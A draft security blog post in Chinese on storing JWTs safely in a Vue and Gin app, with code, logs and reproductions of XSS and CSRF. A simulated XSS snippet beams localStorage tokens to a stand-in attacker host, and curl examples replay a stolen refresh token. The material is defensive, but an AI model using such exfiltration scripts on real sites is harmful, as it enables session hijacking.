---
title: "JWT 別整包放 localStorage"
date: 2026-11-10T08:00:00+08:00
lastmod: 2026-11-10T08:00:00+08:00
draft: true
description: "access token 放記憶體、refresh token 放 HttpOnly cookie，並用自訂 header 擋 CSRF。附 Gin 與 Vue 的寫法、XSS 與 CSRF 的實際重現，以及這個改法擋不住的東西。"
categories: [security]
tags: [jwt, cookie, xss]
---

Vue 加 Gin 的專案，登入後常把拿到的 token 直接存進 localStorage。頁面上任何一段被注入的 script 都能把它讀出來送走，之後從別台機器繼續用。這篇給改法：access token 放記憶體、refresh token 放 HttpOnly cookie，也說明改完之後仍然擋不住什麼。

<!--more-->

文中的輸出都是實際跑出來的，環境是 Go 1.27.3、Gin 1.12.0、Vue 3.5.45、Vite 8.3.7、Chrome 157。範例為了精簡，token 用隨機字串代替簽章過的 JWT；存放位置的問題跟 token 格式無關。

## 問題：一段 XSS 就能把 refresh token 送到別人的主機

我用一支 script 模擬被注入的內容，它把 localStorage 整包送到另一台主機：

```js
const out = { localStorage: { ...localStorage } }
navigator.sendBeacon('http://127.0.0.1:9090/collect', JSON.stringify(out))
```

攻擊者的主機收到（節錄）：

```text
evil received: {"localStorage":{"refresh_token":"MVHQTM63Y6LBHGWLAVCO6UDCPI","access_token":"Z6DEFYZFIJSW466QHKV55DVBAN"}, ...}
```

拿到 refresh token 之後，攻擊者不需要受害者的瀏覽器。下面是在另一個終端機用 curl 連續換兩次 token，再拿新的 access token 呼叫 API（指令已簡化，回應是原樣）：

```text
$ curl -X POST /api/auth/refresh -d '{"refresh_token":"MVHQTM63..."}'
{"access_token":"OFSLMEKTH2IGQ5DB2V6AGTVVEE","expires_in":5,"refresh_token":"PTNGZV6LH5IZPULOOCWWDSIZTI"}
$ curl -X POST /api/auth/refresh -d '{"refresh_token":"PTNGZV6L..."}'
{"access_token":"QZDJDC3E2K45MONCNBT7DSGZI4","expires_in":5,"refresh_token":"RPR6VVRFPJGE3XI53TXDZGALWG"}
GET /api/me -> 200
```

access token 設得再短也沒用，因為能換新 token 的那一把也被拿走了。範例每次 refresh 都會發一把新期限的 refresh token，所以受害者關掉分頁、甚至關機之後，攻擊者還是能一直換下去，直到有人從伺服器端撤銷它。

## 修法一：access token 只放模組變數，重新整理後用 cookie 換回

前端不再把任何憑證寫進儲存空間。access token 放在一個模組變數裡：

```ts
// accessToken.ts
let accessToken: string | null = null

export function getAccessToken(): string | null {
  return accessToken
}

export function setAccessToken(token: string | null): void {
  accessToken = token
}

// 帶這個 header，後端才用 cookie 收發 refresh token。
export const COOKIE_FLOW_HEADERS = { 'X-Auth-Mode': 'cookie' } as const
```

模組變數重新整理就消失，所以頁面載入時要用 refresh cookie 換一把新的。沒登入過的訪客不該每次都多打一個必定失敗的請求，所以 localStorage 留一個不含憑證的旗標：

```ts
export async function restoreSession(): Promise<boolean> {
  if (!mayHaveSession()) return false // 只看 localStorage 裡的 has_session
  return tokenRequest('/api/auth/refresh')
}
```

同一個瀏覽器設定檔載入兩次，第一次是登入，第二次（等同重新整理）由 cookie 換回：

```text
fresh login, /api/me -> demo
restored from cookie, /api/me -> demo
```

## 修法二：refresh token 放進只送往 refresh 路由的 HttpOnly cookie

後端把 refresh token 寫進 cookie，回應的 body 不再帶它：

```go
const (
	refreshCookie = "__Secure-refresh_token"
	refreshPath   = "/api/auth/refresh"
)

func (s *server) writeRefreshCookie(c *gin.Context, token string, maxAge int) {
	c.SetCookieData(&http.Cookie{
		Name:     refreshCookie,
		Value:    token,
		Path:     refreshPath,
		MaxAge:   maxAge,
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteStrictMode,
	})
}
```

實際送出的 header：

```text
Set-Cookie: __Secure-refresh_token=<token>; Path=/api/auth/refresh; Max-Age=3600; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly`：script 讀不到，這是整個改法的核心。
- `Path`：瀏覽器只在 refresh 路由帶上這顆 cookie，其他 API 請求不會帶著它到處跑。
- `Max-Age`：跟 refresh token 的壽命一致，兩者一起過期。
- `SameSite=Strict`：跨站請求不帶這顆 cookie，下一節會看到。

`Path` 有一個副作用：登出請求也收不到這顆 cookie。範例的登出是用 access token 找出同一組的 refresh token 來作廢，再用同樣的 `Path` 送一顆 `Max-Age` 為負的 cookie 讓瀏覽器刪掉它。瀏覽器登出時的伺服器紀錄，`cookies=[]` 表示沒帶任何 cookie：

```text
POST /api/auth/logout origin=http://localhost:5173 X-Auth-Mode="cookie" cookies=[] -> 204
```

把同一支模擬 XSS 的 script 放到改過的頁面上。為了確認讀不到的原因是 `HttpOnly` 而不是 `Path`，我另外放了兩顆同路徑、沒有 `HttpOnly` 的對照 cookie，並從該路徑下的 iframe 讀 `document.cookie`：

```json
{
  "localStorage": {
    "has_session": "1"
  },
  "cookieAtRefreshPath": "control=visible; control_none=visible",
  "inPageRefresh": {
    "status": 200,
    "body": {
      "access_token": "AXW6P3W7ZLQAFTIZOJ2ERWVYSF",
      "expires_in": 5
    }
  }
}
```

localStorage 只剩旗標；`document.cookie` 只有對照組。同一個 iframe 請求在伺服器這邊則是三顆都到了：

```text
GET /api/auth/refresh/probe origin= X-Auth-Mode="" cookies=[__Secure-refresh_token control control_none] -> 404
```

瀏覽器有這顆 cookie，只是不給 script 看。最後的 `inPageRefresh` 留到「反對意見」一節說明。

## 修法三：要求自訂 header，而且後端不核可跨來源預檢，CSRF 就送不進來

cookie 會被瀏覽器自動帶上，所以要處理 CSRF。做法是只有帶著自訂 header 的請求才會去讀 cookie：

```go
func wantsCookieFlow(c *gin.Context) bool {
	return c.GetHeader("X-Auth-Mode") == "cookie"
}
```

跨來源的頁面要在請求裡加自訂 header，瀏覽器會先送 CORS 預檢。後端沒有核可任何預檢，真正的請求就不會被送出。防線的本體是「後端不核可預檢」，header 只是觸發預檢的手段。

從另一個站（`127.0.0.1:9090`）的頁面發兩種請求，先不帶 header、再帶 header。頁面看到的結果與伺服器紀錄：

```json
{
  "simplePost": "sent, response type opaque",
  "withHeader": "TypeError: Failed to fetch"
}
```

```text
POST /api/auth/refresh origin=http://127.0.0.1:9090 X-Auth-Mode="" cookies=[control_none] -> 401
OPTIONS /api/auth/refresh origin=http://127.0.0.1:9090 X-Auth-Mode="" cookies=[] -> 404
```

不帶 header 的 POST 送得出去，但只有 `SameSite=None` 的對照 cookie 跟著來，refresh cookie 被 `SameSite=Strict` 擋下。帶 header 的那一個只有預檢到達伺服器，後面的 POST 沒有出現。

`SameSite` 只看「站」，不看 origin。同一個實驗改從同站、不同 origin 的頁面（`localhost:5173` 直接打 `localhost:8080`）發出，refresh cookie 就跟著來了：

```text
POST /api/auth/refresh origin=http://localhost:5173 X-Auth-Mode="" cookies=[control control_none __Secure-refresh_token] -> 401
OPTIONS /api/auth/refresh origin=http://localhost:5173 X-Auth-Mode="" cookies=[] -> 404
```

這時擋住它的是 header：cookie 到了，但請求沒帶 header，後端不讀 cookie，回 401；帶 header 的照樣死在預檢。所以不能只靠 `SameSite`。

## 適用邊界：前後端同 origin 才成立，CLI 這類用戶端維持 body 流程

- **前端和 API 要同一個 origin**：同站只夠讓 `SameSite=Strict` 放行。上一節的紀錄顯示，同站但不同 origin 的頁面一樣過不了預檢，自家前端也不例外。開發時用 Vite 的 proxy 讓兩者同 origin，上面的重現就是用它跑的：

  ```ts
  // vite.config.ts
  server: {
    proxy: { '/api': 'http://127.0.0.1:8080' },
  }
  ```

- **不能為了跨 origin 而放行這個 header**：把後端改成核可預檢並允許 credentials 之後，同站不同 origin 的頁面就拿得到 token，回應是 `status 200`：

  ```text
  OPTIONS /api/auth/refresh origin=http://localhost:5173 X-Auth-Mode="" cookies=[] -> 204
  POST /api/auth/refresh origin=http://localhost:5173 X-Auth-Mode="cookie" cookies=[__Secure-refresh_token] -> 200
  ```

- **本機開發的 `Secure`**：Chrome 157 在 `http://localhost` 上接受帶 `Secure` 與 `__Secure-` 字首的 cookie，重現沒有另外架 HTTPS。[待驗證] Firefox 與 Safari 在 `http://localhost` 上是否同樣接受，我沒有測。
- **非瀏覽器用戶端不用改**：CLI 不執行網頁上的 script，沒有 XSS 的問題。它不帶 header，登入與 refresh 照舊從 body 拿 refresh token。

## 反對意見：XSS 成立後攻擊者照樣能當場呼叫 refresh，這是真的

HttpOnly 讓 script 讀不到 cookie，但擋不住 script 使用它。前面那份輸出的 `inPageRefresh` 就是這樣來的：注入的 script 在頁面內直接打 refresh 端點。

```js
const res = await fetch('/api/auth/refresh', { method: 'POST', headers: { 'X-Auth-Mode': 'cookie' } })
```

它拿到了一把 access token，而且可以送出去。差別在這把 token 能用多久。範例把 access token 的壽命設成 5 秒，下面是在另一個終端機使用偷到的 access token：

```text
GET /api/me -> 200
GET /api/me (6s later) -> 401
POST /api/auth/refresh (no cookie) -> 401
```

access token 過期後，攻擊者手上沒有能換新 token 的東西。要繼續，就得讓注入的 script 在受害者的頁面裡再跑一次。攻擊窗口是「受害者開著被注入頁面的時間，加上一把 access token 的壽命」；localStorage 的版本不需要受害者在線上，能用多久取決於伺服器何時撤銷那把 refresh token。

這個改法因此有兩個前提：access token 的壽命要短，以及它不取代輸出跳脫與 CSP。XSS 成立時，攻擊者在那段時間內仍然能以使用者的身分做任何事。

## 結論：長效憑證不要放在 script 讀得到的地方

改法是三件事：access token 只放記憶體；refresh token 放 `HttpOnly`、`Secure`、`SameSite=Strict` 且限定路徑的 cookie；讀 cookie 的請求要求自訂 header，後端不核可跨來源預檢。這樣 XSS 帶不走長效憑證，攻擊只能在受害者開著頁面時進行。沒換到的是對 XSS 本身的防護，那仍然要靠輸出跳脫與 CSP。
